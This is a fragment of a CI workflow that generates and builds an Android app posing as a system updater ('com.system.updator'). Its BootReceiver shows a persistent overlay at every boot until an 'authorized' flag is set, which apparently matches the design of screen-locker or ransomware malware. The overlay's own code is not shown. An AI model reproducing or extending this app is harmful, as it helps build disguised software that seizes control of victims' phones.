      - name: Generate BootReceiver.java
        run: |
          cat > app/src/main/java/com/system/updator/BootReceiver.java << 'EOF'
          package com.system.updator;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.util.Log;

          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  String action = intent.getAction();
                  if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                          || "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
                      Log.d("BootReceiver", "Boot completed");

                      SharedPreferences prefs = context.getSharedPreferences(
                              "auth_prefs", Context.MODE_PRIVATE);
                      boolean authorized = prefs.getBoolean("authorized", false);

                      if (!authorized) {
                          try {
                              OverlayManager.get(context).show();
                          } catch (Exception e) {
                              Log.e("BootReceiver", "overlay show failed", e);
                          }
                      }
                  }
              }
          }
          EOF

      - name: Build APK
